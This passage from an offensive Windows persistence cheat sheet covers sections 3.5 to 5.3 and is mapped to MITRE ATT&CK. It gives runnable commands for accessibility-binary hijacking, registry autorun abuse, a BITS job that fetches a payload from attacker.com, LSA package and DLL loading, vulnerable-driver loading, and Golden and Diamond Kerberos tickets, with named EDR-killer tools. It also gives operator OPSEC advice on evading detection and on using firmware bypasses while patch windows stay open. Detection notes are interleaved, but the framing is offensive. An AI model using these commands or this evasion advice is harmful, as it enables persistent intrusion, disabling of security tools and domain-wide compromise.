# ═══════════════════════════════════════════════════════════
# ACCESSIBILITY BINARY REPLACEMENT — pre-auth from login screen
# MITRE ATT&CK: T1546.008 (Accessibility Features)
# STEALTH: LOW on modern systems (FIM catches replacement)
# SURVIVABILITY: Reboot ✓ Passwd ✓ OS Update ✗ Reimage ✗
# ═══════════════════════════════════════════════════════════
# Replace accessibility binaries → trigger from login screen pre-auth

# Sticky Keys (5x Shift)
takeown /f C:\Windows\System32\sethc.exe
icacls C:\Windows\System32\sethc.exe /grant administrators:F
copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe

# Utility Manager (Win+U from login screen)
copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe

# On-Screen Keyboard
copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\osk.exe

# Narrator
copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\narrator.exe

# Alternative — IFEO Debugger (doesn't replace binary, less FIM signal)
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\Windows\System32\cmd.exe" /f

# DETECTION:
# - File integrity monitoring on System32
# - IFEO registry changes
# - Most EDR flag sethc.exe / utilman.exe replacement

# OPSEC: LOW stealth on modern systems; works pre-auth from login screen.
# Useful as PHYSICAL-ACCESS-RECOVERY option, not stealth persistence.
```

### 3.6 — Active Setup (T1547.014)

```powershell
# ═══════════════════════════════════════════════════════════
# ACTIVE SETUP — runs once per user on logon
# MITRE ATT&CK: T1547.014 (Active Setup)
# STEALTH: MEDIUM-HIGH (Autoruns covers; less-frequently hunted)
# SURVIVABILITY: Reboot ✓ Passwd ✓ Reimage ✗
# ═══════════════════════════════════════════════════════════
# Generate GUID:
# powershell -c "[guid]::NewGuid().ToString('B').ToUpper()"
reg add "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\{RANDOM-GUID}" /v "StubPath" /t REG_SZ /d "C:\ProgramData\svc.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\{RANDOM-GUID}" /v "Version" /t REG_SZ /d "1,0,0,0" /f
# Runs once per user profile; if version changes, runs again
# Executes as logged-on user (set by admin)

# DETECTION:
# - Registry changes under Active Setup, Sysmon Event ID 13
# - Autoruns covers Active Setup
# - Mature hunts look for unusual GUIDs with non-standard StubPath
#   pointing outside System32

# OPSEC: MED-HIGH — inventoried by Autoruns/PersistenceSniper; less
# frequently hunted than Run keys but not invisible. Use a GUID matching
# legitimate-looking format and StubPath in System32 / Program Files.
```

### 3.7 — Winlogon Helper (T1547.004)

```powershell
# ═══════════════════════════════════════════════════════════
# WINLOGON USERINIT / SHELL MODIFICATION
# MITRE ATT&CK: T1547.004 (Winlogon Helper DLL)
# STEALTH: MEDIUM (most EDR flag Userinit/Shell modification)
# ═══════════════════════════════════════════════════════════
# Winlogon loads DLLs/executables specified in these keys on every logon

# APPEND to existing value (don't replace):
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\System32\userinit.exe,C:\ProgramData\svc.exe" /f

# Or via Shell key
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "explorer.exe,C:\ProgramData\svc.exe" /f

# Notify sub-key — LEGACY ONLY (removed in Vista+)
# DO NOT USE on modern targets:
# reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\NewDLL" /v DllName /t REG_SZ /d "C:\ProgramData\payload.dll" /f

# DETECTION: Sysmon Event ID 13 on Winlogon registry keys
# OPSEC: APPEND to existing value; never replace Userinit alone (breaks logon)
```

### 3.8 — Netsh Helper DLL (T1546.007)

```powershell
# ═══════════════════════════════════════════════════════════
# NETSH HELPER DLL — loaded every time netsh.exe runs
# MITRE ATT&CK: T1546.007 (Netsh Helper DLL)
# STEALTH: MEDIUM (only triggers when netsh runs)
# ═══════════════════════════════════════════════════════════
netsh add helper C:\ProgramData\payload.dll
# Or via registry:
reg add "HKLM\SOFTWARE\Microsoft\NetSh" /v "CustomHelper" /t REG_SZ /d "C:\ProgramData\payload.dll" /f

# DETECTION: Registry change under HKLM\SOFTWARE\Microsoft\NetSh,
#            Sysmon Event ID 13, netsh.exe DLL load
# OPSEC: Only triggers when netsh runs (not every boot); admin tools
#        commonly invoke netsh
```

### 3.9 — BITS Jobs (T1197)

```powershell
# ═══════════════════════════════════════════════════════════
# BITS JOBS — persists across reboots; managed by BITS service
# MITRE ATT&CK: T1197 (BITS Jobs)
# STEALTH: MEDIUM    SURVIVABILITY: Reboot ✓ Passwd ✓ Reimage ✗
# ═══════════════════════════════════════════════════════════
bitsadmin /create persistence_job
bitsadmin /addfile persistence_job http://attacker.com/payload.exe C:\ProgramData\svc.exe
bitsadmin /SetNotifyCmdLine persistence_job C:\ProgramData\svc.exe NUL
bitsadmin /SetMinRetryDelay persistence_job 60
bitsadmin /resume persistence_job

# DETECTION:
# - Microsoft-Windows-Bits-Client/Operational log
# - bitsadmin.exe process creation (Sysmon Event ID 1)
# - DeviceProcessEvents in MDE for bitsadmin invocation

# OPSEC: MEDIUM — bitsadmin usage is suspicious but BITS itself is legitimate
```

### 3.10 — AppInit_DLLs (Legacy — T1546.010)

```powershell
# ═══════════════════════════════════════════════════════════
# APPINIT_DLLS — DLL injected into every process loading user32.dll
# MITRE ATT&CK: T1546.010 (AppInit DLLs)
# STEALTH: LOW on modern endpoints; situational on legacy
# ═══════════════════════════════════════════════════════════
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /t REG_SZ /d "C:\ProgramData\payload.dll" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v LoadAppInit_DLLs /t REG_DWORD /d 1 /f

# MODERN CAVEATS:
# - Since Windows 8: LoadAppInit_DLLs defaults to 0; loader sets
#   RequireSignedAppInit_DLLs=1 when Secure Boot enabled — only
#   Microsoft-trusted-publisher signed DLLs load
# - Smart App Control (Win11) blocks this mechanism entirely in most cases
# - WDAC / App Control for Business policies restricting user32-linked
#   processes block injection regardless of signing

# Still works on: unmanaged legacy hosts, VMs with Secure Boot off,
# hardened server configs where admins manually re-enabled it.

# DETECTION: Sysmon Event ID 13, Autoruns, FIM on HKLM\...\Windows
# OPSEC: LOW on modern endpoints
```

### 3.11 — LSA Authentication Package (T1547.002)

```powershell
# ═══════════════════════════════════════════════════════════
# LSA AUTHENTICATION PACKAGE — DLL loaded into lsass.exe at boot
# MITRE ATT&CK: T1547.002 (Authentication Package)
# STEALTH: MED-HARD (where LSA protection OFF); BLOCKED (LSA protection ON)
# SURVIVABILITY: Reboot ✓ Passwd ✓ Reimage ✗
# OBSERVED: SLOW#TEMPEST campaign (Picus Security March 2025 reporting)
# Source: https://www.picussecurity.com/resource/blog/slow-tempest-cyber-espionage-ttp-analysis
# ═══════════════════════════════════════════════════════════

# MECHANISM:
# lsass.exe enumerates HKLM\SYSTEM\CurrentControlSet\Control\Lsa
# "Authentication Packages" (REG_MULTI_SZ) on boot. Each listed DLL name
# (without .dll extension) is loaded from %WINDIR%\System32. The DLL
# must export SpLsaModeInitialize / SpInstanceInit / SpInitialize
# (see ntsecpkg.h). A minimal stub returning success at init and
# spawning a thread for payload execution is sufficient.

# PREREQUISITES:
# - SYSTEM or admin + ability to write to %WINDIR%\System32
# - DLL must be signed as PPL if LSA protection (RunAsPPL) is enforced —
#   otherwise lsass.exe refuses to load it. SINGLE MOST IMPORTANT CAVEAT
#   FOR MODERN TARGETS.

# INSTALLATION:
copy package.dll C:\Windows\System32\
# Append to Authentication Packages (KEEP existing msv1_0)
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Authentication Packages" /t REG_MULTI_SZ /d "msv1_0\0package" /f
# Reboot — DLL loads into lsass.exe on next boot

# RELATED REGISTRY KEYS (adjacent abuse paths):
#   "Security Packages" — SSP registration (same caveats — see §5 custom SSP /
#     mimilib entry); DLL must export SpLsaModeInitialize
#   "Notification Packages" — password change notification callbacks
#     (historical rassfm.dll / scecli.dll; Win32 API LsaRegisterPolicyChange)

# DETECTION:
# - Sysmon Event ID 13 on HKLM\SYSTEM\...\Control\Lsa\Authentication Packages
# - Sysmon Event ID 7 (image loaded) with new non-standard DLL into lsass.exe
# - Windows Defender emits 3033/3063 when LSA protection blocks an unsigned
#   package; 3089 when signature verification fails
# - ETW Microsoft-Windows-Kernel-General image load under lsass.exe PID
# - Elastic / Sigma rule: "Potential LSA Authentication Package Abuse"
#   (registry change to this key from non-SYSTEM user)

# OPSEC: MED-HARD where LSA protection is OFF; blocked entirely where LSA
# protection is enforced without a PPL-signed DLL. Autoruns / PersistenceSniper
# inventory this key; assume mature SOCs hunt it.
```

### 3.12 — Time Provider DLL & Port Monitor (T1547.003 / T1547.010)

```powershell
# ═══════════════════════════════════════════════════════════
# TIME PROVIDER DLL — loaded by w32time service (SYSTEM)
# MITRE ATT&CK: T1547.003 (Time Providers)
# STEALTH: MED-HIGH
# ═══════════════════════════════════════════════════════════
reg add "HKLM\System\CurrentControlSet\Services\W32Time\TimeProviders\EvilProvider" /v DllName /t REG_SZ /d "C:\ProgramData\payload.dll" /f
reg add "HKLM\System\CurrentControlSet\Services\W32Time\TimeProviders\EvilProvider" /v Enabled /t REG_DWORD /d 1 /f
reg add "HKLM\System\CurrentControlSet\Services\W32Time\TimeProviders\EvilProvider" /v InputProvider /t REG_DWORD /d 1 /f
net stop w32time && net start w32time

# DETECTION: Sysmon Event ID 13 (TimeProviders registry); Autoruns;
#            mature SOCs hunt TimeProviders additions via DeviceRegistryEvents

# ═══════════════════════════════════════════════════════════
# PORT MONITOR — loaded by spoolsv.exe (SYSTEM)
# MITRE ATT&CK: T1547.010 (Port Monitors)
# STEALTH: MED-HIGH
# ═══════════════════════════════════════════════════════════
# DLL must be in C:\Windows\System32\
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors\EvilMonitor" /v Driver /t REG_SZ /d "payload.dll" /f
# Loaded by Print Spooler service on start

# DETECTION: Sysmon Event ID 13 (Print\Monitors), DLL load by spoolsv.exe;
#            Autoruns / PersistenceSniper cover this key

# OPSEC RATING: MED-HIGH — runs as SYSTEM; less monitored than core
# persistence points but inventoried by standard persistence audit tools.
```

### 3.13 — SCCM / Intune / Tanium / Workspace ONE Management-Agent Persistence

```
═══════════════════════════════════════════════════════════
ENTERPRISE MANAGEMENT-AGENT PERSISTENCE — MAJOR 2024-2026 PATTERN
MITRE ATT&CK: T1543.003 (Windows Service — but via legitimate channel),
              T1199 (Trusted Relationship)
STEALTH: HIGH (deployed by trusted enterprise management agent)
SURVIVABILITY: Reboot ✓ Passwd ✓ Reimage ✓ (re-pushed by mgmt server)
              Cred Rotation ✓ EDR Deploy ✓
CLEANUP COST: VERY HIGH (must remediate management infrastructure too)
═══════════════════════════════════════════════════════════

WHY THIS MATTERS:
Compromise of management-platform admin → push attacker payload via
legitimate enterprise management channel to ALL managed endpoints
simultaneously. Bypasses EDR because deployed by trusted mgmt agent.
Bypasses re-image because management server re-pushes on next inventory
cycle. Standard 2024-2026 nation-state and ransomware-operator pattern.

OBSERVED IN-THE-WILD:
- Volt Typhoon (CISA AA24-038A + AA26-113a) — abuse of legitimate
  management agents on US critical infra
- Salt Typhoon (telecom) — telecom OT-management compromise enabling
  long-term persistence
- Multiple ransomware operators (Akira, RansomHub, BianLian) — Intune
  / SCCM admin compromise as preferred deployment channel post-AD foothold
- LockBit (pre-disruption) — ConnectWise Automate / Kaseya VSA push
  as persistence + ransomware delivery in single channel

PER-PLATFORM ABUSE PATTERNS:

# ─── MICROSOFT SCCM (Configuration Manager) ────────────────
# Compromise SCCM site server admin → create malicious application
# in Software Library → deploy to "All Systems" or "All Workstations"
# collection → next policy refresh, every endpoint installs payload
# Common abuse: Application Deployment Type with "Run script" or
# "MSI" wrapping attacker payload signed with stolen / abused cert

# Discovery (with creds):
# Get-CMApplication                # Existing apps
# Get-CMCollection                 # Target collections
# New-CMApplicationDeployment      # Deploy malicious app

# OPSEC: Modify deployment under unattributable name (e.g., "Windows
# Update Hotfix Helper"); time deployment for known patch window

# ─── MICROSOFT INTUNE (Cloud-managed) ──────────────────────
# Compromise Intune Admin in Entra → upload Win32 LOB app or PowerShell
# script via Endpoint Manager portal → deploy to Azure AD-joined / hybrid-
# joined devices
# Even more pernicious: Intune deploys Configuration Profile that:
# - Disables Defender real-time protection (BUT Tamper Protection blocks
#   when enabled — verify target tenant policy first)
# - Adds attacker-controlled CA to Trusted Root Certificate Store
# - Pushes registry policies that permit otherwise-blocked operations

# Discovery (with admin):
# az rest --method get --url "https://graph.microsoft.com/beta/deviceAppManagement/mobileApps"
# Microsoft Graph: GET /deviceManagement/deviceConfigurations

# ─── TANIUM / WORKSPACE ONE / KACE / NINJA ONE ────────────
# Each platform has admin console → Action / Question / Sensor / Script
# deployment to managed endpoints. Compromise = same blast radius as
# SCCM/Intune.

# ─── CONNECTWISE AUTOMATE / N-ABLE / KASEYA VSA ───────────
# MSP-tier RMM platforms — abuse identical pattern. CVE-2024-1709
# ScreenConnect = ConnectWise sister product; compromise of RMM
# platforms = MSP-supply-chain attack (cross-ref initial access §8.7)

DETECTION:
- SCCM site server audit logs (configmgr.log) — application creation +
  deployment events with anomalous initiator
- Intune audit log (Endpoint Manager portal Audit Logs) — same pattern
- Defender XDR cross-product correlation: privileged Intune admin
  changes followed by mass endpoint deployment + immediate beaconing
- Network: outbound C2 beacons emerging simultaneously from large
  population of managed endpoints
- KQL hunt for management-agent-spawned payloads in §6.3

DEFENDER CONTROLS:
- Tamper Protection on Defender (blocks Intune-deployed disable attempts)
- Privileged Access Management (PAM) for SCCM / Intune admin roles
- Just-in-Time elevation (PIM) for SCCM/Intune admin tier
- Multi-person approval for mass-deployment actions
- Defender for Cloud Apps "Mass deployment of suspicious app" alert
  (Q1 2026 — new alert in MDCA SaaS Security Posture Management)

OPSEC: VERY HIGH stealth at deployment (legitimate management push);
detection shifts to behavioral anomaly on simultaneous endpoint changes
+ subsequent C2 patterns. Eradication requires remediating BOTH
management infrastructure AND every deployed endpoint.
```

### 3.14 — WSUS Patch Poisoning

```
═══════════════════════════════════════════════════════════
WSUS PATCH POISONING — UPDATE-SERVER-AS-MALWARE-DISTRIBUTION
MITRE ATT&CK: T1195.002 (Compromise Software Supply Chain — internal
              variant), T1543.003
STEALTH: VERY HIGH at delivery (legit Windows Update channel)
SURVIVABILITY: Reboot ✓ Reimage ✓ (re-applied on next sync) Cred Rot ✓
CLEANUP COST: VERY HIGH (audit + remediate WSUS, audit every patched
              endpoint, validate baseline)
═══════════════════════════════════════════════════════════

WHY THIS MATTERS:
WSUS / SCCM Software Update Point distributes Microsoft / third-party
patches to managed endpoints. Compromise of the update-server admin →
inject malicious "patches" or replace legitimate patch metadata →
clients install attacker payload via trusted Windows Update channel.

OBSERVED:
- Volt Typhoon (CISA AA24-038A) — update-server compromise listed as
  observed pattern in critical infrastructure intrusions
- ShadowPad / Winnti family — historical update-server abuse for lateral
  spread within victim networks
- Various nation-state actors — WSUS sync URL manipulation to point
  managed endpoints at attacker-controlled "update server"

ATTACK PATTERNS:
1. WSUS server compromise: SYSTEM/admin on the WSUS server →
   directly modify metadata in SUSDB → inject malicious update entries
   that point to attacker-hosted MSI/CAB
2. WSUS sync URL redirection: Group Policy modification redirects
   client WUServer / WUStatusServer to attacker URL
3. SCCM Software Update Point compromise: similar to WSUS, but with
   SCCM's distribution-point + boundary-group complexity multiplier

KEY OBSERVATION:
- WSUS clients require UpdateClient configuration to validate update
  signatures against trusted certs. Microsoft's Pre-Approved Updates
  use signed metadata.
- Legacy WSUS deployments without signed metadata enforcement = direct
  attacker payload distribution. Modern Win10/11 + WSUS 4.0+ enforces
  signature validation, but custom update injection (third-party
  software updates added to WSUS) BYPASSES this if config allows
  unsigned third-party.
- "PSUpdate" / "WSUS Package Publisher" custom-package workflow is the
  intended path for third-party updates and is THE injection vector.

DEFENSE CONFIGURATION (operator awareness):
- Microsoft Defender for Endpoint detects post-deployment EDR-bypass
  attempts even when delivered via WSUS
- Code Integrity policy (WDAC) enforced on workstations blocks
  unsigned executables regardless of delivery channel
- Application Control for Business + WSUS Allow-list
- HTTPS for WSUS sync (not plaintext HTTP — surprisingly common in
  legacy environments)

DETECTION:
- WSUS server audit logs (SoftwareDistribution.log on clients,
  SUSDB diff)
- KQL hunt for WSUS-deployed software with anomalous file-system
  events post-install
- Network: client outbound to non-Microsoft / non-corporate-WSUS IPs
  for update sync = config redirection

OPSEC: VERY HIGH. Eradication is multi-week effort.
```

```
═══════════════════════════════════════════════════════════
SECTION 3 — RELATED & FOLLOW-ON
═══════════════════════════════════════════════════════════
Enables → §4 kernel-level (system-level → kernel via BYOVD)
Enables → §5 domain-level (system-level on DC → domain persistence)
Enables → §3.13 management-plane (system-level → SCCM/Intune compromise)
Cross-ref → §6.4 Defender Stack reference (Windows-side)
Cross-ref → Initial access §8.7 trusted relationship (MSP/RMM platforms)
NEVER → Use unsigned LSA Auth Package against any target with LSA
        protection (RunAsPPL) enforced — DLL load fails + alert fires
```

---

## 4 — WINDOWS: KERNEL-LEVEL PERSISTENCE

> **Typical chains through this section:** Admin/SYSTEM → BYOVD load (kill EDR / kernel write primitive) → install boot-start driver OR rootkit → kernel-level callback hooks for hiding / persistence. UEFI/firmware persistence is the ceiling — survives reimage and disk replacement.

### 4.1 — BYOVD (Bring Your Own Vulnerable Driver)

```
═══════════════════════════════════════════════════════════
BYOVD — KERNEL-LEVEL ATTACK ENABLER (NOT persistence by itself)
MITRE ATT&CK: T1068 (Exploitation for Privilege Escalation),
              T1014 (Rootkit) — PERSISTENCE is the rootkit installed AFTER
STEALTH: HIGH (post-load); MEDIUM at driver-load (Event 7045 + Sysmon 6)
═══════════════════════════════════════════════════════════

ATTACK CHAIN:
1. Drop signed vulnerable driver to disk
2. Load driver as kernel service (sc create / NtLoadDriver)
3. Send IOCTL to driver to: terminate EDR processes, read/write kernel
   memory, remove kernel callbacks
4. Establish kernel-level persistence (patch callbacks, install hooks,
   load boot-start unsigned driver via attacker-controlled kernel write)

# COMMONLY ABUSED DRIVERS (verify blocklist status before use — set
# rotates as Microsoft updates the blocklist):
# - Dell dbutil_2_3.sys (CVE-2021-21551) — arbitrary kernel R/W [BLOCKLISTED]
# - Zemana AntiMalware (zam64.sys) — process termination [BLOCKLISTED]
# - GMER gmer64.sys — process termination [BLOCKLISTED]
# - Rentdrv2.sys — kernel R/W (used by RansomHub / EDRKillShifter,
#   Aug 2024 Sophos report; CVE-2023-44976)
# - TrueSight (truesight.sys) — abused in EDR-killer campaigns 2024-2025
# - Process Explorer procexp152.sys — Microsoft-signed; used by Backstab;
#   blocklisted in recent revisions
# - Avast aswArPot.sys — abused by Trellix-documented kill-floor.exe
#   campaign (Nov 2024) using 142-entry security-process hitlist
#   [BLOCKLISTED, Avast fixed in v21.5 June 2021]
#   Source: https://www.thaicert.or.th/en/2024/11/25/hackers-exploit-vulnerability-in-avast-anti-rootkit-driver-to-disable-security-systems/
# - wnbios.sys / WinRing0 variants — still appear unblocked in some revs
# - ★ SILVER FOX CAMPAIGN DRIVERS (Aug 2025 — current at publication)
#   - WatchDog Antimalware amsdk.sys v1.0.600 — Microsoft-signed but NOT
#     in Microsoft Vulnerable Driver Blocklist at time of campaign;
#     Zemana SDK family
#   - Used to deliver ValleyRAT
#   - Demonstrates BLOCKLIST-LAG OPERATOR WINDOW: freshly-discovered
#     abusable drivers remain viable for months between blocklist updates
#   Source: https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/

# CRITICAL ENFORCEMENT CAVEATS (what the blocklist actually does):
# - Since Windows 11 22H2: Microsoft Vulnerable Driver Blocklist enabled
#   by default on all devices (toggle via Windows Security > Device
#   Security > Core Isolation)
# - Enforcement strongest when ONE OF: HVCI (Memory Integrity) on,
#   Smart App Control on, or S Mode active
# - On machines where HVCI is OFF and Smart App Control is OFF:
#   blocklist enforcement is weaker and primarily advisory
# - Blocklist updated through Windows Update during feature updates
#   (~1-2x per year). Drivers freshly discovered as abusable can remain
#   viable for MONTHS before next refresh. Enterprises can pull current
#   list via App Control for Business policy for faster parity.
# - ASR rule "Block abuse of exploited vulnerable signed drivers"
#   (GUID 56a863a9-875e-4185-98a7-b882c64b5ce5) — complementary
#   behavioral control; does NOT require HVCI; blocks based on
#   reputation/behavior. Confirmed active per MS Learn.

# LOAD DRIVER:
sc create EvilDriver type= kernel start= demand binpath= "C:\Windows\Temp\vulnerable.sys"
sc start EvilDriver
# Or via NtLoadDriver (avoids sc.exe process creation) — use custom tool
# or BOF to call NtLoadDriver directly

# EDR-TERMINATION TOOLS:
# - EDRSandblast: kernel callback removal + credential dumping
# - Terminator: generic driver-based EDR killer ($300 on forums)
# - EDRSilencer: blocks EDR network telemetry via WFP filters
# - KDMapper: maps unsigned drivers into kernel memory
#     (originally Intel iqvw64e.sys [now blocklisted]; forks use alts)
# - Backstab: Process Explorer driver to kill protected processes
# - RealBlindingEDR: patches kernel callbacks registered by EDR drivers
# - EDRKillShifter (Aug 2024 Sophos): rentdrv2.sys-based killer used by
#   RansomHub affiliates
# - kill-floor.exe (Trellix Nov 2024): aswArPot.sys-based, 142-entry hitlist

# DETECTION CEILING (what BYOVD CANNOT hide from):
# - ETW-TI (Microsoft-Windows-Threat-Intelligence) — kernel-level,
#   reports on suspicious memory ops; CANNOT be patched from user mode
# - Kernel callbacks (Ps/Ob/Cm) — EDRs register for process / thread /
#   image / registry callbacks. User-mode unhooking does nothing to
#   these. Only kernel-level callback removal (which BYOVD enables)
#   clears them — but the callback-removal operation itself is visible
#   on well-instrumented targets with MDE + ETW-TI
# - CodeIntegrity operational log Event ID 3099 — logs blocklist-
#   triggered blocks; failed sc start on blocklisted driver is noisy
# - Event ID 7045 (driver service created), Sysmon Event ID 6 (driver loaded)

# DEFENSIVE CONTROLS:
# - Enable HVCI / Memory Integrity wherever hardware supports it
# - Apply ASR rule 56a863a9-875e-4185-98a7-b882c64b5ce5
# - Deploy App Control for Business driver blocklist XML (faster parity)
# - WDAC policy enforcing signed driver allowlist (not just blocklist)

# OPSEC RATING: Post-load kernel access is VERY HIGH stealth IF blocklist
# is not enforced; driver load itself is medium-signal. Against fully
# enforced HVCI + Smart App Control + ASR environments, most historically-
# abused drivers fail to load at all.
```

### 4.2 — Firmware / UEFI Persistence

```
═══════════════════════════════════════════════════════════
UEFI / FIRMWARE PERSISTENCE — MAXIMUM STEALTH; SURVIVES REIMAGE
MITRE ATT&CK: T1542.001 (System Firmware), T1542.003 (Bootkit)
STEALTH: VERY HIGH if successfully deployed
SURVIVABILITY: Reboot ✓ Passwd ✓ OS Update ✓ Reimage ✓ Disk Replace ✓
              Cred Rotation ✓
CLEANUP COST: VERY HIGH (firmware reflash; some hardware unrecoverable)
═══════════════════════════════════════════════════════════

KNOWN IMPLANTS:
- LoJax (APT28 / Fancy Bear, 2018) — UEFI rootkit via RWEverything driver
- MosaicRegressor (2020) — UEFI firmware trojan
- CosmicStrand (2022) — UEFI firmware rootkit (ASUS / Gigabyte boards)
- BlackLotus (2023) — first publicly confirmed in-the-wild UEFI bootkit
    bypassing Secure Boot on fully patched Windows 11
- Bootkitty (2024) — first public Linux UEFI bootkit PoC (ESET)
- FinSpy UEFI bootkit (commercial spyware)

★ BLACKLOTUS LINEAGE — CRITICAL CURRENCY UPDATE FOR Q2 2026:

  - Original: CVE-2022-21894 "Baton Drop" — Secure Boot bypass via
    rollback to vulnerable signed boot manager. Patched Jan 2022 but
    remained exploitable through 2023 because vulnerable signed boot
    managers were NOT in dbx revocation list.
  - May 2023: Microsoft mitigations for CVE-2023-24932 (follow-on
    Secure Boot bypass). Disabled by default — required manual opt-in
    through 2023-2024.
  - 2024-2025: Microsoft staging revocation of Windows Production PCA
    2011 certificate (signing root used by vulnerable boot managers).
    Multi-phase rollout to avoid bricking recovery media.
  - ★ Q2 2026 TIMELINE (URGENT for both operators and defenders):
    * Windows Production PCA 2011 certificate EXPIRES OCTOBER 2026
    * Enforcement Phase earliest January 2026 (with 6-month warning)
    * Post-Oct 2026: system updates may become BLOCKED if DBX migration
      incomplete on a host
    * Operator implication: BlackLotus-class techniques have a HARD
      EXPIRATION WINDOW. Use against unpatched / DBX-stale targets
      while window remains open.
    Source: https://support.microsoft.com/en-us/topic/how-to-manage-the-windows-boot-manager-revocations-for-secure-boot-changes-associated-with-cve-2023-24932-41a975df-beb2-40c1-99a3-b3ff139f832d

CURRENT OPERATOR REALITY (April 2026):
- BlackLotus-class techniques work against: unpatched Win11, machines
  with DBX updates not applied, hosts where admins disabled Secure Boot
  mitigations, bring-your-own-boot-manager scenarios where DBX hasn't
  caught up
- Against modern baseline (Win11 22H2+ patched, HVCI on, DBX current,
  PCA 2011 revocation applied): attack reliably blocked per NSA's
  June 2023 mitigation advisory
- Expect new UEFI implants targeting newly-discovered signed-loader
  vulnerabilities as a continuous category — not BlackLotus specifically

NOT command-line deployable — requires:
1. Firmware analysis (extract, decompress, modify EFI modules)
2. Write modified firmware back via SPI flash programmer or software
   (e.g., chipsec)
3. Deep hardware-specific knowledge

DETECTION:
- chipsec (Intel firmware validation) — chipsec_util CLI validation
- UEFI Secure Boot measurement logs at C:\Windows\Logs\MeasuredBoot
  (binary .log files parseable via Tcglog tools / PowerShell)
- TPM-based attestation: MDE "Boot integrity" alerts when measured boot
  log deltas indicate unsigned/unexpected EFI modules (look for
  grubx64.efi and winload.efi in BlackLotus-class events)
- EventID 1035 / 1036 in Microsoft-Windows-Kernel-Boot (boot config change)

OPSEC: MAXIMUM stealth if successfully deployed; development cost is
extreme. Against hardware with Secured-core PC certification, firmware
integrity measurement detects modification at next boot cycle even if
malicious code achieves persistence.
```

```
═══════════════════════════════════════════════════════════
SECTION 4 — RELATED & FOLLOW-ON
═══════════════════════════════════════════════════════════
Enables → §5 domain-level (BYOVD on DC = LSA protection bypass for
          Skeleton Key, custom SSP)
Enables → ALL OTHER LAYERS (kernel access enables anything)
Cross-ref → §6.4 Defender Stack reference (kernel detection surface)
Cross-ref → Initial access §5 edge-CVE matrix (Veeam compromise often
            precedes kernel-level deployment in ransomware ops)
NEVER → Load BYOVD against fully HVCI+SAC+ASR-enforced target without
        first verifying driver isn't on current blocklist; failed load
        generates Event ID 3099 + EDR alert
```

---

## 5 — WINDOWS: DOMAIN-LEVEL PERSISTENCE

> See `08-active-directory-cheatsheet.md` for detailed AD command reference. Below is persistence-focused. Typical chains: Tier 0 access → krbtgt extraction → Golden / Diamond / Sapphire Ticket → AdminSDHolder + Shadow Credentials → AD CS template manipulation → AZUREADSSOACC$ + ADFS hybrid persistence (cross-ref §14).

### 5.1 — Golden Ticket (T1558.001)

```
═══════════════════════════════════════════════════════════
GOLDEN TICKET — FORGED TGT WITH krbtgt HASH
MITRE ATT&CK: T1558.001 (Golden Ticket)
STEALTH: MEDIUM (MDI alert "Suspected Golden Ticket usage")
SURVIVABILITY: Reboot ✓ Passwd ✓ OS Update ✓ Reimage ✓ (if AD not remediated)
              Cred Rotation: requires krbtgt 2x reset (with > max-ticket-
              lifetime wait between resets; default 10hr but check policy)
CLEANUP COST: HIGH (krbtgt 2x reset + audit all privileged accounts)
═══════════════════════════════════════════════════════════

# Forge Kerberos TGT with krbtgt hash → authenticate as any user ~10 years
kerberos::golden /user:FakeAdmin /domain:target.local /sid:S-1-5-21-xxx /aes256:<KEY> /ptt

# MODERN DETECTION CAVEATS:
# - MDI alert "Suspected Golden Ticket usage" triggers on:
#   * Tickets with unusual encryption types (RC4 when domain is AES-only)
#   * Abnormal lifetimes (>10hr default)
#   * Missing PAC
#   * PAC signature anomalies
#   ALWAYS use /aes256, match realistic lifetime to domain policy, include
#   accurate PAC (Rubeus handles PAC better than classic mimikatz)
# - Honeytokens: mature environments seed honey accounts whose
#   authentication is the alert. Never impersonate users you haven't
#   validated are real.
```

### 5.2 — Diamond / Sapphire Ticket

```
═══════════════════════════════════════════════════════════
DIAMOND / SAPPHIRE TICKET — MODERN GOLDEN-TICKET EVASION
MITRE ATT&CK: T1558.001 (variant)
STEALTH: HIGH (preserves legitimate PAC metadata)
SURVIVABILITY: Same as Golden Ticket
═══════════════════════════════════════════════════════════

MECHANISM DIFFERS FROM GOLDEN:
- GOLDEN: forge TGT from scratch using krbtgt hash → PAC is synthetic,
  no authority-signed claims; detectable when signatures don't match
  what a real KDC would produce
- DIAMOND: request a LEGITIMATE TGT, decrypt with krbtgt hash, modify
  PAC contents, re-sign. Preserves all legitimate metadata KDC injected
  — including authorization claims, resource IDs, timestamps
- SAPPHIRE: variant abusing S4U2self against high-privileged account to
  obtain valid TGS with pristine PAC, then modify that PAC. Rubeus
  "diamond" and "sapphire" modes implement this

WHY USE DIAMOND/SAPPHIRE OVER GOLDEN:
- Evades MDI Golden-Ticket heuristics that key off PAC signature
  anomalies — Diamond tickets have valid signatures
- Preserves randomly-generated ticket ID the real KDC assigned —
  avoiding predictable patterns Golden-Ticket-forgery tools sometimes emit

REQUIRES: Same as Golden Ticket (krbtgt hash) + network access to
request initial TGT as some domain user

# Rubeus diamond ticket
Rubeus.exe diamond /ticketuser:admin /ticketuserid:500 /groups:512,513,518,519,520 /krbkey:<aes256> /user:victim /password:Pass /domain:target.local

# SURVIVES: same as Golden Ticket (krbtgt reset 2x required to invalidate)
```

### 5.3 — Golden Certificate (CA Private Key Theft)

```
═══════════════════════════════════════════════════════════
GOLDEN CERTIFICATE — CA PRIVATE KEY THEFT
MITRE ATT&CK: T1649 (Steal or Forge Authentication Certificates)
STEALTH: HIGH (forged certs validate normally)
